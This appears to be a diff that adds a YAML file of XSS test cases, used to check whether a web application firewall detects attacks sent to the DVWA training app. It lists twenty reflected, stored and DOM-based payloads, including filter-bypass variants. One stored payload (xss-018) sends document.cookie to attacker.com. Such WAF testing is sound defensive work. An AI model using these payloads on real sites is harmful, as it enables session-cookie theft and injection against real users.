@@ -1,0 +1,180 @@
+# =============================================================================
+# Cross-Site Scripting (XSS) Test Cases
+# =============================================================================
+# DVWA의 XSS 취약점을 통해 WAF의 XSS 탐지 능력을 검증합니다.
+# Stored XSS, Reflected XSS, DOM-based XSS 등 다양한 유형을 테스트합니다.
+# =============================================================================
+
+category: "xss"
+name: "Cross-Site Scripting"
+description: "XSS (Cross-Site Scripting) 공격 탐지 테스트"
+severity: "critical"
+icon: "💉"
+
+tests:
+  # --- Reflected XSS ---
+  - id: "xss-001"
+    description: "Reflected XSS - 기본 <script>alert"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>alert(1)</script>"
+    severity: "critical"
+
+  - id: "xss-002"
+    description: "Reflected XSS - <img onerror>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<img src=x onerror=alert(1)>'
+    severity: "critical"
+
+  - id: "xss-003"
+    description: "Reflected XSS - <svg onload>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<svg onload=alert(1)>'
+    severity: "critical"
+
+  - id: "xss-004"
+    description: "Reflected XSS - <body onload>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<body onload=alert(1)>'
+    severity: "critical"
+
+  - id: "xss-005"
+    description: "Reflected XSS - JavaScript URI"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: 'javascript:alert(1)'
+    severity: "high"
+
+  # --- Stored XSS ---
+  - id: "xss-006"
+    description: "Stored XSS - <script> (Stored)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<script>alert(document.cookie)</script>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xss-007"
+    description: "Stored XSS - <img onerror> (Stored)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: '<img src=x onerror=alert(document.domain)>'
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- DOM-based XSS ---
+  - id: "xss-008"
+    description: "DOM XSS - #<script>"
+    method: "GET"
+    path: "/vulnerabilities/xss_d/"
+    params:
+      default: "<script>alert(1)</script>"
+    severity: "critical"
+
+  - id: "xss-009"
+    description: "DOM XSS - #<img onerror>"
+    method: "GET"
+    path: "/vulnerabilities/xss_d/"
+    params:
+      default: '<img src=x onerror=alert(1)>'
+    severity: "critical"
+
+  # --- WAF 우회 기법 ---
+  - id: "xss-010"
+    description: "XSS - 대소문자 혼합 <ScRiPt>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<ScRiPt>alert(1)</ScRiPt>"
+    severity: "medium"
+
+  - id: "xss-011"
+    description: "XSS - 이중 태그 <scr<script>ipt>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<scr<script>ipt>alert(1)</scr<script>ipt>"
+    severity: "medium"
+
+  - id: "xss-012"
+    description: "XSS - onfocus+javascript"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<input onfocus=alert(1) autofocus>'
+    severity: "high"
+
+  - id: "xss-013"
+    description: "XSS - <details ontoggle>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<details open ontoggle=alert(1)>'
+    severity: "high"
+
+  - id: "xss-014"
+    description: "XSS - <marquee onstart>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<marquee onstart=alert(1)>'
+    severity: "medium"
+
+  - id: "xss-015"
+    description: "XSS - 이벤트 핸들러 다양화"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<a href="" onmouseover=alert(1)>test</a>'
+    severity: "high"
+
+  - id: "xss-016"
+    description: "XSS - Hex 인코딩"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: "<script>eval('\\x61\\x6c\\x65\\x72\\x74(1)')</script>"
+    severity: "medium"
+
+  - id: "xss-017"
+    description: "XSS - data: URI"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<a href="data:text/html;base64,PHNjcmllcHQ+YWxlcnQoMSk8L3NjcmlwdD4=">click</a>'
+    severity: "high"
+
+  - id: "xss-018"
+    description: "XSS - POST Stored <script>"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xss-019"
+    description: "XSS - <iframe srcdoc>"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<iframe srcdoc="<script>alert(1)</script>">'
+    severity: "high"
+
+  - id: "xss-020"
+    description: "XSS - CSS expression()"
+    method: "GET"
+    path: "/vulnerabilities/xss_r/"
+    params:
+      name: '<div style="background:url(javascript:alert(1))">'
+    severity: "medium"
